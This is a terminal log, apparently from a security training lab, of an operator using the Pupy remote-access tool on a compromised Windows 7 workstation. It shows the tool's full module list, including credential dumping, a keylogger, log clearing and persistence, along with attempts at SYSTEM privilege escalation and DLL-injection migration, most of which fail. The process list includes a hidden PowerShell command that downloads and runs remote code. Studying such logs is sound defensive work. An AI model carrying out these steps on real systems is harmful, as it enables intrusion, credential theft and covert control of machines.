release        7                                                          
version        6.1.7601                                                   
os_arch        AMD64                                                      
proc_arch      32bit                                                      
pid            1396                                                       
exec_path      C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe  
cid            0000000006b319b0                                           
address        172.16.0.7                                                 
macaddr        1e:97:2d:f3:32:85                                          
revision       ?                                                          
node           1e972df33285                                               
native         True                                                       
proxy          ?                                                          
external_ip    ?                                                          
uac_lvl        2/3                                                        
intgty_lvl     Medium                                                     
local_adm      Yes                                                        
transport      tcp_cleartext                                              
launcher       connect                                                    
launcher_args  --host 172.16.11.106:8888 --transport tcp_cleartext        
platform       windows/x86                                                
>> sessions -l
[-] sessions: unrecognized arguments: -l
usage: sessions [-h] [-i <filter>] [-g] [-k <id>] [-K] [-d <id>] [-D]

>> sessions
id  user               hostname        platform  release  os_arch  proc_arch  intgty_lvl  address     tags  
------------------------------------------------------------------------------------------------------------
1   RESEARCH\kroberts  RSRCH-WIN7-WS1  Windows   7        AMD64    32bit      Medium      172.16.0.7        
>> info
hostname       RSRCH-WIN7-WS1                                             
user           RESEARCH\kroberts                                          
release        7                                                          
version        6.1.7601                                                   
os_arch        AMD64                                                      
proc_arch      32bit                                                      
pid            1396                                                       
exec_path      C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe  
cid            0000000006b319b0                                           
address        172.16.0.7                                                 
macaddr        1e:97:2d:f3:32:85                                          
revision       ?                                                          
node           1e972df33285                                               
native         True                                                       
proxy          ?                                                          
external_ip    ?                                                          
uac_lvl        2/3                                                        
intgty_lvl     Medium                                                     
local_adm      Yes                                                        
transport      tcp_cleartext                                              
launcher       connect                                                    
launcher_args  --host 172.16.11.106:8888 --transport tcp_cleartext        
platform       windows/x86                                                
>> help -M
{ COMMANDS }
COMMAND   DESCRIPTION                                                  
-----------------------------------------------------------------------
jobs      Manage Jobs                                                  
help      Show help                                                    
sessions  list/interact with established sessions                      
python    Start the local python interpreter (for debugging purposes)  
dnscnc    DNSCNC control                                               
exposed   list exposed objects/methods                                 
creds     Credentials manager                                          
tag       Assign tag to current session                                
exit      Exit Shell                                                   
connect   Connect to the bind payload                                  
run       Run a module on one or multiple clients                      
logging   Show/set log level                                           
config    Work with configuration file                                 
gen       Generate payload                                             
restart   Restart pupysh                                               
listen    start/stop/show current listeners                            

{ MODULES }
CATEGORY  NAME               HELP                                                                                                              
-----------------------------------------------------------------------------------------------------------------------------------------------
admin     clear_logs         Clear Event Logs                                                                                                  
admin     psh                Load/Execute Powershell Scripts                                                                                   
admin     ssh                Ssh Client                                                                                                        
admin     rfs                Mount Remote Fs As Fuse Fs To Mountpoint                                                                          
admin     reg                Search/List/Get/Set/Delete Registry Keys/Values                                                                   
admin     smbspider          Walk Through A Smb Directory And Recursively Search A String Into Files                                           
admin     shell_exec         Execute Shell Commands On A Remote System                                                                         
admin     logs               Show Logs (Or Try To Search Something)                                                                            
admin     alive              Request To Send Keepalive Packets On Rpyc Level                                                                   
admin     rdesktop           Start A Remote Desktop Session Using A Browser Websocket Client                                                   
admin     cp                 Copy File Or Directory                                                                                            
admin     interactive_shell  Open An Interactive Command Shell With A Nice Tty                                                                 
admin     shares             List Local And Remote Shared Folder And Permission                                                                
admin     rm                 Remove A File Or A Directory                                                                                      
admin     smb                Copy Files Via Smb Protocol                                                                                       
admin     hibernate          Close Session During X Hours                                                                                      
admin     netstat            List Terminal Sessions                                                                                            
admin     become             Become User                                                                                                       
admin     sshell             Interactive Ssh Shell                                                                                             
admin     last               List Terminal Sessions                                                                                            
admin     rdp                Enable / Disable Rdp Connection Or Check For Valid Credentials On A Remote Host                                   
admin     w                  List Terminal Sessions                                                                                            
admin     getdomain          Get Primary Domain Controller                                                                                     
admin     cd                 Change Directory                                                                                                  
admin     date               Get Current Date                                                                                                  
admin     pexec              Execute Shell Commands Non-Interactively On A Remote System In Background Using Popen                             
admin     ps                 List Processes                                                                                                    
admin     zip                Zip / Unzip File Or Directory                                                                                     
admin     mkdir              Create An Empty Directory                                                                                         
admin     dns                Retrieve Domain Name From Ip And Vice Versa                                                                       
admin     ls                 List System Files                                                                                                 
admin     psexec             Launch Remote Commands Using Smbexec Or Wmiexec                                                                   
admin     pwd                Get Current Working Dir                                                                                           
admin     pyexec             Execute Python Code On A Remote System                                                                            
admin     beroot             Check For Privilege Escalation Path                                                                               
admin     cat                Show Contents Of A File                                                                                           
admin     pyshell            Open An Interactive Python Shell On The Remote Client                                                             
admin     mv                 Move File Or Directory                                                                                            
admin     display            Set Display Variable                                                                                              
admin     ip                 List Interfaces                                                                                                   
admin     getpid             List Process Information                                                                                          
admin     sudo_alias         Write An Alias For Sudo To Retrieve User Password                                                                 
admin     igd                Upnp Igd Client                                                                                                   
admin     stat               Show A Bit More Info About File Path. Acls/Caps/Owner For Now                                                     
admin     http               Trivial Get/Post Requests Via Http Protocol                                                                       
admin     x509               Fetch Certificate From Server                                                                                     
admin     getppid            List Parent Process Information                                                                                   
admin     drives             List Valid Drives In The System                                                                                   
admin     services           List Services                                                                                                     
admin     getuid             Get Username                                                                                                      
creds     loot_memory        Crawl Processes Memory And Look For Cleartext Credentials                                                         
creds     creddump           Download The Hives From A Remote Windows System And Dump Creds                                                    
creds     lazagne            Retrieve Passwords Stored On The Target                                                                           
creds     mimipy             Run Mimipy To Retrieve Credentials From Memory                                                                    
creds     memstrings         Dump Printable Strings From Process Memory For Futher Analysis                                                    
exploit   mimishell          Execute Mimikatz From Memory (Interactive)                                                                        
exploit   mimikatz           Execute Mimikatz From Memory (Non-Interactive)                                                                    
exploit   exploit_suggester  Exploit Suggester                                                                                                 
exploit   shellcode_exec     Executes The Supplied Shellcode On A Client                                                                       
exploit   impersonate        List/Impersonate Process Tokens                                                                                   
gather    keylogger          A Keylogger To Monitor All Keyboards Interaction Including The Clipboard :-)                                      
gather    hashmon            Try To Find Clear Text Passwords In Memory                                                                        
gather    get_info           Get Some Informations About One Or Multiple Clients                                                               
gather    contacts           To Get Contacts                                                                                                   
gather    isearch            Use Windows Search Index To Search For Data                                                                       
gather    search             Walk Through A Directory And Recursively Search A String Into Files                                               
gather    check_vm           Check If Running On Virtual Machine                                                                               
gather    outlook            Interact With Outlook Session Of The Targeted User                                                                
gather    record_mic         Record Sound With The Microphone !                                                                                
gather    pywerview          Rewriting Of Some Powerview'S Functionalities In Python                                                           
gather    apps               To Interact Manage Applications                                                                                   
gather    call               To Get Call Details                                                                                               
gather    mouselogger        Log Mouse Clicks And Take Screenshots Of Areas Around It                                                          
gather    powerview          Execute Powerview Commands                                                                                        
gather    get_hwuuid         Try To Get Uuid (Dmi) Or Machine-Id (Dbus/Linux)                                                                  
gather    webcamsnap         Take A Webcam Snap :)                                                                                             
gather    usniper            Globally Capture String Or Register During Execution At Specified                                                 
gather    cloudinfo          Retrieve Ec2/Digitalocean Metadata                                                                                
gather    users              Get Interactive Users                                                                                             
gather    screenshot         Take A Screenshot :)                                                                                              
gather    ttyrec             Globally Capture Intput/Output To Tty. Compatible With Kernels                                                    
gather    gpstracker         To Interact With Gps                                                                                              
general   exit               Exit The Client On The Other Side                                                                                 
general   process_kill       Kill A Process                                                                                                    
manage    getprivs           Manage Current Process Privileges                                                                                 
manage    edit               Edit Remote File Locally (Download->Edit->Upload)                                                                 
manage    upload             Upload A File/Directory To A Remote System                                                                        
manage    hide_process       Edit Current Process Argv & Env Not To Look Suspicious                                                            
manage    download           Download A File/Directory From A Remote System                                                                    
manage    tasks              Get Info About Registered Background Tasks                                                                        
manage    memory_exec        Execute A Executable From Memory                                                                                  
manage    lock_screen        Lock The Session                                                                                                  
manage    duplicate          Duplicate The Current Pupy Payload By Executing It From Memory                                                    
manage    load_package       Load A Python Package Onto A Remote Client. Packages Files Must Be Placed In One Of The Pupy/Packages/<Os>/<Arch>/
manage    migrate            Migrate Pupy Into Another Process Using Reflective Dll Injection                                                  
manage    write              Write Short String To File                                                                                        
manage    env                List/Get/Set/Unset Client Environment Variables                                                                   
manage    persistence        Enable / Disable Persistence                                                                                      
network   port_scan          Run A Tcp Port Scan                                                                                               
network   forward            Local/Remote Port Forwarding And Socks Proxy                                                                      
network   tcpdump            Module To Reproduce Some Of The Classic Tcpdump Tool Functions                                                    
privesc   getsystem          Try To Get Nt Authority System Privileges                                                                         
privesc   bypassuac                                                                                                                            
privesc   inveigh            Execute Inveigh Commands                                                                                          
privesc   privesc_checker    Linux Privilege Escalation Scripts                                                                                
troll     text_to_speach     Use Android Text To Speach To Say Something :)                                                                    
troll     vibrate            Activate The Phone/Tablet Vibrator :)                                                                             
troll     msgbox             Pop Up A Custom Message Box                                                                                       

{ ALIASES }
ALIAS    COMMAND            
----------------------------
info     get_info           
pyexec   pyexec             
exec     shell_exec         
ps       ps                 
migrate  migrate            
shell    interactive_shell  
kill     process_kill       
mount    drives             
du       download -S        
>> help -M getsystem
Module: getsystem: Try To Get Nt Authority System Privileges

usage: getsystem [-h] -m {impersonate,inheritance} [-x EXECUTE] [-r] [-p]
                 [--ppid PARENTID] [-k] [-t TIMEOUT]

Try to get NT AUTHORITY SYSTEM privileges

- Case 1: If the launcher on the target uses a reverse connection (e.g. connect or auto_proxy),
this module will migrate on a created SYSTEM process ('impersonate' method) or
it will create a new SYSTEM process thanks to a handle inheritance ('inheritance' method) aka 'parent method'.
In this case, the created SYSTEM launcher will connect to your pupy contoller automatically.
- Case 2: If the launcher on the target uses a bind connection, this module will enable the 'powershell' option by default.
In this case, a payload will be uploaded and it will be executed as System on the target.
This payload listens on your given port on the target. You have to connect to this launcher manually.

optional arguments:
  -h, --help            show this help message and exit
  -m {impersonate,inheritance}, --method {impersonate,inheritance}
                        Method for gaining a new pupy session as SYSTEM
  -x EXECUTE            Change the default process to create/inject into
  -r                    Relaunch current executable as system (dangerous)
  -p                    Force to use a powershell payload
  --ppid PARENTID       Force this ppid ('inheritance' method only)
  -k                    Close this current connection after migration
                        ('impersonate' method only)
  -t TIMEOUT            Wait n seconds a reverse connection during migration
                        (default: 60) ('impersonate' method only)


{ Compatibility }
Y  PupyClient(id=1, user=RESEARCH\kroberts, hostname=RSRCH-WIN7-WS1, platform=Windows)  

>> help -M
{ COMMANDS }
COMMAND   DESCRIPTION                                                  
-----------------------------------------------------------------------
jobs      Manage Jobs                                                  
help      Show help                                                    
sessions  list/interact with established sessions                      
python    Start the local python interpreter (for debugging purposes)  
dnscnc    DNSCNC control                                               
exposed   list exposed objects/methods                                 
creds     Credentials manager                                          
tag       Assign tag to current session                                
exit      Exit Shell                                                   
connect   Connect to the bind payload                                  
run       Run a module on one or multiple clients                      
logging   Show/set log level                                           
config    Work with configuration file                                 
gen       Generate payload                                             
restart   Restart pupysh                                               
listen    start/stop/show current listeners                            

{ MODULES }
CATEGORY  NAME               HELP                                                                                                              
-----------------------------------------------------------------------------------------------------------------------------------------------
admin     clear_logs         Clear Event Logs                                                                                                  
admin     psh                Load/Execute Powershell Scripts                                                                                   
admin     ssh                Ssh Client                                                                                                        
admin     rfs                Mount Remote Fs As Fuse Fs To Mountpoint                                                                          
admin     reg                Search/List/Get/Set/Delete Registry Keys/Values                                                                   
admin     smbspider          Walk Through A Smb Directory And Recursively Search A String Into Files                                           
admin     shell_exec         Execute Shell Commands On A Remote System                                                                         
admin     logs               Show Logs (Or Try To Search Something)                                                                            
admin     alive              Request To Send Keepalive Packets On Rpyc Level                                                                   
admin     rdesktop           Start A Remote Desktop Session Using A Browser Websocket Client                                                   
admin     cp                 Copy File Or Directory                                                                                            
admin     interactive_shell  Open An Interactive Command Shell With A Nice Tty                                                                 
admin     shares             List Local And Remote Shared Folder And Permission                                                                
admin     rm                 Remove A File Or A Directory                                                                                      
admin     smb                Copy Files Via Smb Protocol                                                                                       
admin     hibernate          Close Session During X Hours                                                                                      
admin     netstat            List Terminal Sessions                                                                                            
admin     become             Become User                                                                                                       
admin     sshell             Interactive Ssh Shell                                                                                             
admin     last               List Terminal Sessions                                                                                            
admin     rdp                Enable / Disable Rdp Connection Or Check For Valid Credentials On A Remote Host                                   
admin     w                  List Terminal Sessions                                                                                            
admin     getdomain          Get Primary Domain Controller                                                                                     
admin     cd                 Change Directory                                                                                                  
admin     date               Get Current Date                                                                                                  
admin     pexec              Execute Shell Commands Non-Interactively On A Remote System In Background Using Popen                             
admin     ps                 List Processes                                                                                                    
admin     zip                Zip / Unzip File Or Directory                                                                                     
admin     mkdir              Create An Empty Directory                                                                                         
admin     dns                Retrieve Domain Name From Ip And Vice Versa                                                                       
admin     ls                 List System Files                                                                                                 
admin     psexec             Launch Remote Commands Using Smbexec Or Wmiexec                                                                   
admin     pwd                Get Current Working Dir                                                                                           
admin     pyexec             Execute Python Code On A Remote System                                                                            
admin     beroot             Check For Privilege Escalation Path                                                                               
admin     cat                Show Contents Of A File                                                                                           
admin     pyshell            Open An Interactive Python Shell On The Remote Client                                                             
admin     mv                 Move File Or Directory                                                                                            
admin     display            Set Display Variable                                                                                              
admin     ip                 List Interfaces                                                                                                   
admin     getpid             List Process Information                                                                                          
admin     sudo_alias         Write An Alias For Sudo To Retrieve User Password                                                                 
admin     igd                Upnp Igd Client                                                                                                   
admin     stat               Show A Bit More Info About File Path. Acls/Caps/Owner For Now                                                     
admin     http               Trivial Get/Post Requests Via Http Protocol                                                                       
admin     x509               Fetch Certificate From Server                                                                                     
admin     getppid            List Parent Process Information                                                                                   
admin     drives             List Valid Drives In The System                                                                                   
admin     services           List Services                                                                                                     
admin     getuid             Get Username                                                                                                      
creds     loot_memory        Crawl Processes Memory And Look For Cleartext Credentials                                                         
creds     creddump           Download The Hives From A Remote Windows System And Dump Creds                                                    
creds     lazagne            Retrieve Passwords Stored On The Target                                                                           
creds     mimipy             Run Mimipy To Retrieve Credentials From Memory                                                                    
creds     memstrings         Dump Printable Strings From Process Memory For Futher Analysis                                                    
exploit   mimishell          Execute Mimikatz From Memory (Interactive)                                                                        
exploit   mimikatz           Execute Mimikatz From Memory (Non-Interactive)                                                                    
exploit   exploit_suggester  Exploit Suggester                                                                                                 
exploit   shellcode_exec     Executes The Supplied Shellcode On A Client                                                                       
exploit   impersonate        List/Impersonate Process Tokens                                                                                   
gather    keylogger          A Keylogger To Monitor All Keyboards Interaction Including The Clipboard :-)                                      
gather    hashmon            Try To Find Clear Text Passwords In Memory                                                                        
gather    get_info           Get Some Informations About One Or Multiple Clients                                                               
gather    contacts           To Get Contacts                                                                                                   
gather    isearch            Use Windows Search Index To Search For Data                                                                       
gather    search             Walk Through A Directory And Recursively Search A String Into Files                                               
gather    check_vm           Check If Running On Virtual Machine                                                                               
gather    outlook            Interact With Outlook Session Of The Targeted User                                                                
gather    record_mic         Record Sound With The Microphone !                                                                                
gather    pywerview          Rewriting Of Some Powerview'S Functionalities In Python                                                           
gather    apps               To Interact Manage Applications                                                                                   
gather    call               To Get Call Details                                                                                               
gather    mouselogger        Log Mouse Clicks And Take Screenshots Of Areas Around It                                                          
gather    powerview          Execute Powerview Commands                                                                                        
gather    get_hwuuid         Try To Get Uuid (Dmi) Or Machine-Id (Dbus/Linux)                                                                  
gather    webcamsnap         Take A Webcam Snap :)                                                                                             
gather    usniper            Globally Capture String Or Register During Execution At Specified                                                 
gather    cloudinfo          Retrieve Ec2/Digitalocean Metadata                                                                                
gather    users              Get Interactive Users                                                                                             
gather    screenshot         Take A Screenshot :)                                                                                              
gather    ttyrec             Globally Capture Intput/Output To Tty. Compatible With Kernels                                                    
gather    gpstracker         To Interact With Gps                                                                                              
general   exit               Exit The Client On The Other Side                                                                                 
general   process_kill       Kill A Process                                                                                                    
manage    getprivs           Manage Current Process Privileges                                                                                 
manage    edit               Edit Remote File Locally (Download->Edit->Upload)                                                                 
manage    upload             Upload A File/Directory To A Remote System                                                                        
manage    hide_process       Edit Current Process Argv & Env Not To Look Suspicious                                                            
manage    download           Download A File/Directory From A Remote System                                                                    
manage    tasks              Get Info About Registered Background Tasks                                                                        
manage    memory_exec        Execute A Executable From Memory                                                                                  
manage    lock_screen        Lock The Session                                                                                                  
manage    duplicate          Duplicate The Current Pupy Payload By Executing It From Memory                                                    
manage    load_package       Load A Python Package Onto A Remote Client. Packages Files Must Be Placed In One Of The Pupy/Packages/<Os>/<Arch>/
manage    migrate            Migrate Pupy Into Another Process Using Reflective Dll Injection                                                  
manage    write              Write Short String To File                                                                                        
manage    env                List/Get/Set/Unset Client Environment Variables                                                                   
manage    persistence        Enable / Disable Persistence                                                                                      
network   port_scan          Run A Tcp Port Scan                                                                                               
network   forward            Local/Remote Port Forwarding And Socks Proxy                                                                      
network   tcpdump            Module To Reproduce Some Of The Classic Tcpdump Tool Functions                                                    
privesc   getsystem          Try To Get Nt Authority System Privileges                                                                         
privesc   bypassuac                                                                                                                            
privesc   inveigh            Execute Inveigh Commands                                                                                          
privesc   privesc_checker    Linux Privilege Escalation Scripts                                                                                
troll     text_to_speach     Use Android Text To Speach To Say Something :)                                                                    
troll     vibrate            Activate The Phone/Tablet Vibrator :)                                                                             
troll     msgbox             Pop Up A Custom Message Box                                                                                       

{ ALIASES }
ALIAS    COMMAND            
----------------------------
info     get_info           
pyexec   pyexec             
exec     shell_exec         
ps       ps                 
migrate  migrate            
shell    interactive_shell  
kill     process_kill       
mount    drives             
du       download -S        
>> help getsystem
Module: getsystem: Try To Get Nt Authority System Privileges

usage: getsystem [-h] -m {impersonate,inheritance} [-x EXECUTE] [-r] [-p]
                 [--ppid PARENTID] [-k] [-t TIMEOUT]

Try to get NT AUTHORITY SYSTEM privileges

- Case 1: If the launcher on the target uses a reverse connection (e.g. connect or auto_proxy),
this module will migrate on a created SYSTEM process ('impersonate' method) or
it will create a new SYSTEM process thanks to a handle inheritance ('inheritance' method) aka 'parent method'.
In this case, the created SYSTEM launcher will connect to your pupy contoller automatically.
- Case 2: If the launcher on the target uses a bind connection, this module will enable the 'powershell' option by default.
In this case, a payload will be uploaded and it will be executed as System on the target.
This payload listens on your given port on the target. You have to connect to this launcher manually.

optional arguments:
  -h, --help            show this help message and exit
  -m {impersonate,inheritance}, --method {impersonate,inheritance}
                        Method for gaining a new pupy session as SYSTEM
  -x EXECUTE            Change the default process to create/inject into
  -r                    Relaunch current executable as system (dangerous)
  -p                    Force to use a powershell payload
  --ppid PARENTID       Force this ppid ('inheritance' method only)
  -k                    Close this current connection after migration
                        ('impersonate' method only)
  -t TIMEOUT            Wait n seconds a reverse connection during migration
                        (default: 60) ('impersonate' method only)


{ Compatibility }
Y  PupyClient(id=1, user=RESEARCH\kroberts, hostname=RSRCH-WIN7-WS1, platform=Windows)  
>> getsystem -m impersonate -x cmd.exe -p --ppid 1712
[%] The current pupy launcher is using a REVERSE connection (e.g. 'auto_proxy' or 'connect' launcher)
[%] A powershell payload will be used for getting a pupy session as SYSTEM
[%] Using powershell payload because you have chosen this option. The launcher on the target uses a reverse connection

{ Configuration }
KEY            VALUE                                                
--------------------------------------------------------------------
launcher       connect                                              
launcher_args  --host 172.16.11.106:8888 --transport tcp_cleartext  
cid            112400816                                            

[+] Required credentials (found)
  + SSL_BIND_CERT
[+] Generating native payload with the current config from pupyx86.dll - size=3428864
[+] packing pupy into C# source ...
[+] compiling via mono command: mcs -target:library -debug- -optimize+ -unsafe -noconfig -sdk:2 -OUT:./pupy_ctHhKwqJ.exe /home/ol/pupy/pupy/pupy_8y9fCw.cs
warning CS8001: SDK path could not be resolved
Compilation succeeded - 1 warning(s)
[+] Wrapped .NET payload - size=3443200
[+] PowerLoader: Serving payload to pipe=DFUNZMDWYU for 90 seconds
[%] PowerLoader: Thread started (pipe=DFUNZMDWYU, payload=3443200, md5=f82aa655cc98b7658efd37adbed0bf60)
2019-02-13 13:26:36,410| (1300, 'Could not set SeDebugPrivilege (access denied)')

>> info
hostname       RSRCH-WIN7-WS1                                             
user           RESEARCH\kroberts                                          
release        7                                                          
version        6.1.7601                                                   
os_arch        AMD64                                                      
proc_arch      32bit                                                      
pid            1396                                                       
exec_path      C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe  
cid            0000000006b319b0                                           
address        172.16.0.7                                                 
macaddr        1e:97:2d:f3:32:85                                          
revision       ?                                                          
node           1e972df33285                                               
native         True                                                       
proxy          ?                                                          
external_ip    ?                                                          
uac_lvl        2/3                                                        
intgty_lvl     Medium                                                     
local_adm      Yes                                                        
transport      tcp_cleartext                                              
launcher       connect                                                    
launcher_args  --host 172.16.11.106:8888 --transport tcp_cleartext        
platform       windows/x86                                                
>> help
{ COMMANDS }
COMMAND   DESCRIPTION                                                  
-----------------------------------------------------------------------
jobs      Manage Jobs                                                  
help      Show help                                                    
sessions  list/interact with established sessions                      
python    Start the local python interpreter (for debugging purposes)  
dnscnc    DNSCNC control                                               
exposed   list exposed objects/methods                                 
creds     Credentials manager                                          
tag       Assign tag to current session                                
exit      Exit Shell                                                   
connect   Connect to the bind payload                                  
run       Run a module on one or multiple clients                      
logging   Show/set log level                                           
config    Work with configuration file                                 
gen       Generate payload                                             
restart   Restart pupysh                                               
listen    start/stop/show current listeners                            

{ ALIASED MODULES }
MODULE   DESCRIPTION                                        
------------------------------------------------------------
alive    request to send keepalive packets on rpyc level    
cp       copy file or directory                             
exit     exit the client on the other side                  
rm       remove a file or a directory                       
netstat  list terminal sessions                             
last     list terminal sessions                             
w        list terminal sessions                             
cd       change directory                                   
date     Get current date                                   
ps       list processes                                     
mkdir    create an empty directory                          
forward  Local/remote port forwarding and SOCKS proxy       
ls       list system files                                  
pwd      Get current working dir                            
cat      show contents of a file                            
mv       move file or directory                             
ip       list interfaces                                    
getpid   list process information                           
http     Trivial Get/Post requests via HTTP protocol        
getppid  list parent process information                    
getuid   get username                                       

{ ALIASES }
ALIAS    COMMAND            
----------------------------
info     get_info           
pyexec   pyexec             
exec     shell_exec         
ps       ps                 
migrate  migrate            
shell    interactive_shell  
kill     process_kill       
mount    drives             
du       download -S        

Use help -M command to show all available modules
>> ps
   0 {System Idle Process} 
   4 {System} 
 132 {winlogbeat.exe} 
 264 {smss.exe} 
 276 {svchost.exe} 
 340 {csrss.exe} 
 376 {wininit.exe} 
 384 {csrss.exe} 
 424 {winlogon.exe} 
 436 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe -type:crashpad-handler --no-upload-gzip --no-rate-limit --capture-python --no-identify-c
 472 {services.exe} 
 480 {lsass.exe} 
 488 {lsm.exe} 
 584 {svchost.exe} 
 656 {svchost.exe} 
 740 {MsMpEng.exe} 
 832 {svchost.exe} 
 864 {svchost.exe} 
 920 {svchost.exe} 
 992 {svchost.exe} 
1040 {Sysmon64.exe} 
1044 {svchost.exe} 
1148 {spoolsv.exe} 
1180 {svchost.exe} 
1200 C:\Windows\System32\taskhost.exe 
1292 {armsvc.exe} 
1312 {auditbeat.exe} 
1396 C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://172.16.
1444 {cagent.exe} 
1512 {DbxSvc.exe} 
1560 {svchost.exe} 
1684 {svchost.exe} 
1712 {metricbeat.exe} 
1892 {osqueryd.exe} 
1940 {TeamViewer_Service.exe} 
1980 {ossec-agent.exe} 
2012 {packetbeat.exe} 
2060 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe -type:exit-monitor -method:collectupload -session-token:e1e07ed6-db78-4f9b-b4f9-77ae9b0a
2332 {unsecapp.exe} 
2368 {WmiPrvSE.exe} 
2396 C:\Windows\explorer.exe 
2464 {WmiPrvSE.exe} 
2668 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe /systemstartup
2816 C:\Program Files\Microsoft Security Client\msseces.exe -hide -runkey
2864 {osqueryd.exe} 
2872 {conhost.exe} 
3176 {WmiPrvSE.exe} 
3384 C:\Windows\System32\conhost.exe 2614504301540442218206115356152445613-842565451-2082273366-42057440-1409489348
3428 \192.168.1.10\share\Labs\DAY-2\Lab-5\QclientX64.exe 
3516 C:\Windows\System32\dwm.exe 
3532 {rundll32.exe} 
3824 {GoogleCrashHandler.exe} 
3892 C:\Users\kroberts.RESEARCH\AppData\Local\Temp\DbRcyAp0FOJJ.exe 
3948 {GoogleCrashHandler64.exe} 
3980 {SearchIndexer.exe} 
4024 {taskhost.exe} 
4864 {TrustedInstaller.exe} 
4904 C:\Windows\System32\notepad.exe C:\Users\kroberts.RESEARCH\Desktop\CbsPersist_20190114040043.log
5108 C:\Users\kroberts.RESEARCH\AppData\Local\Temp\BGr4up2eObHA.exe 
>> migrate 1712
[+] Migrating to existing windows process identified with the pid 1712
[+] looking for configured connect back address ...
[+] address configured is 172.16.11.106:8888 ...
[+] looking for process 1712 architecture ...
2019-02-13 13:27:15,056| (6L, 'The handle is invalid.')

>> help migrate
Module: migrate: Migrate Pupy Into Another Process Using Reflective Dll Injection

usage: migrate [-h] [--no-wait] [-c <exe_path>] [-p process_name] [-k]
               [-t TIMEOUT]
               [pid]

Migrate pupy into another process using reflective DLL injection 

positional arguments:
  pid                   pid

optional arguments:
  -h, --help            show this help message and exit
  --no-wait             Does not Hook exit thread function and wait until pupy
                        exists (Linux)
  -c <exe_path>, --create <exe_path>
                        create a new process and inject into it
  -p process_name, --process process_name
                        search a process name and migrate into
  -k, --keep            migrate into the process but create a new session and
                        keep the current pupy session running
  -t TIMEOUT, --timeout TIMEOUT
                        time in seconds to wait for the connection


{ Compatibility }
Y  PupyClient(id=1, user=RESEARCH\kroberts, hostname=RSRCH-WIN7-WS1, platform=Windows)  

Alias: migrate: migrate
>> pwd
[+] C:\
>> dir
[-] Unknown (or unavailable) command dir. Use help -M to list available commands and modules
>> ls
C:\:
  23/12/18  D      0.0B $Recycle.Bin                            
  14/07/09  D      0.0B Documents and Settings                  
  16/01/19  D      0.0B MSOCache                                
  13/07/09  D      0.0B PerfLogs                                
  16/01/19  D      0.0B Program Files                           
  16/01/19  D      0.0B Program Files (x86)                     
  16/01/19  D      0.0B ProgramData                             
  28/11/18  D      0.0B Recovery                                
  13/02/19  D      0.0B System Volume Information               
  23/12/18  D      0.0B Users                                   
  16/01/19  D      0.0B Windows                                 
  21/12/18  D      0.0B found.000                               
  13/02/19         1.5G hiberfil.sys                            
  13/02/19         2.0G pagefile.sys                            
[%] Summary: Files: 2 (size: 3.5G) Dirs: 12 Total: 14
>> cd windows
>> [-] PowerLoader: WaitNamedPipe - Timeout (90, pipe=\\.\pipe\DFUNZMDWYU, gle=2)
[-] PowerLoader: Open/Push - Fail ([Errno 2] No such file or directory: '\\\\.\\pipe\\DFUNZMDWYU')
>> 
>> help migrate
Module: migrate: Migrate Pupy Into Another Process Using Reflective Dll Injection

usage: migrate [-h] [--no-wait] [-c <exe_path>] [-p process_name] [-k]
               [-t TIMEOUT]
               [pid]

Migrate pupy into another process using reflective DLL injection 

positional arguments:
  pid                   pid

optional arguments:
  -h, --help            show this help message and exit
  --no-wait             Does not Hook exit thread function and wait until pupy
                        exists (Linux)
  -c <exe_path>, --create <exe_path>
                        create a new process and inject into it
  -p process_name, --process process_name
                        search a process name and migrate into
  -k, --keep            migrate into the process but create a new session and
                        keep the current pupy session running
  -t TIMEOUT, --timeout TIMEOUT
                        time in seconds to wait for the connection


{ Compatibility }
Y  PupyClient(id=1, user=RESEARCH\kroberts, hostname=RSRCH-WIN7-WS1, platform=Windows)  

Alias: migrate: migrate
>> pwd
[+] C:\windows\system32
>> migrate -c C:\windows\system32\cmd.exe
[+] Migrating to new windows process
2019-02-13 13:29:45,872| (2, 'The system cannot find the file specified')

========= Remote Traceback (1) =========
Traceback (most recent call last):
WindowsError: [Error 2] The system cannot find the file specified
Traceback (most recent call last):
  File "/home/ol/pupy/pupy/pupylib/PupyJob.py", line 164, in module_worker
    module.run(self.args)
  File "/home/ol/pupy/pupy/modules/migrate.py", line 56, in run
    p=self.client.conn.modules['pupwinutils.processes'].start_hidden_process(args.create)
  File "/usr/local/lib/python2.7/dist-packages/rpyc/core/netref.py", line 199, in __call__
    return syncreq(_self, consts.HANDLE_CALL, args, kwargs)
  File "/usr/local/lib/python2.7/dist-packages/rpyc/core/netref.py", line 72, in syncreq
    return conn.sync_request(handler, oid, *args)
  File "/home/ol/pupy/pupy/network/lib/connection.py", line 387, in sync_request
    raise obj
exceptions.WindowsError: (2, 'The system cannot find the file specified')

========= Remote Traceback (1) =========
Traceback (most recent call last):
WindowsError: [Error 2] The system cannot find the file specified

[-] (2, 'The system cannot find the file specified')

========= Remote Traceback (1) =========
Traceback (most recent call last):
WindowsError: [Error 2] The system cannot find the file specified
>> migrate -c "C:\windows\system32\cmd.exe"
[+] Migrating to new windows process
[+] C:\windows\system32\cmd.exe created with pid 3728
[+] looking for configured connect back address ...
[+] address configured is 172.16.11.106:8888 ...
[+] looking for process 3728 architecture ...
[+] process is 32 bits

{ Configuration }
KEY            VALUE                                                
--------------------------------------------------------------------
launcher       connect                                              
launcher_args  --host 172.16.11.106:8888 --transport tcp_cleartext  
cid            112400816                                            

[+] Required credentials (found)
  + SSL_BIND_CERT
[+] Template: pupyx86.dll
[+] injecting DLL in target process 3728 ...
2019-02-13 13:30:00,283| [INJECT] inject_dll. VirtualAllocEx 2 failed

========= Remote Traceback (1) =========
Traceback (most recent call last):
Exception: [INJECT] inject_dll. VirtualAllocEx 2 failed
Traceback (most recent call last):
  File "/home/ol/pupy/pupy/pupylib/PupyJob.py", line 164, in module_worker
    module.run(self.args)
  File "/home/ol/pupy/pupy/modules/migrate.py", line 74, in run
    win_migrate(self, pid, args.keep, args.timeout, bindPort=listeningPort)
  File "/home/ol/pupy/pupy/modules/lib/windows/migrate.py", line 56, in migrate
    module.client.conn.modules['pupy'].reflective_inject_dll(pid, dllbuff, isProcess64bits)
  File "/usr/local/lib/python2.7/dist-packages/rpyc/core/netref.py", line 199, in __call__
    return syncreq(_self, consts.HANDLE_CALL, args, kwargs)
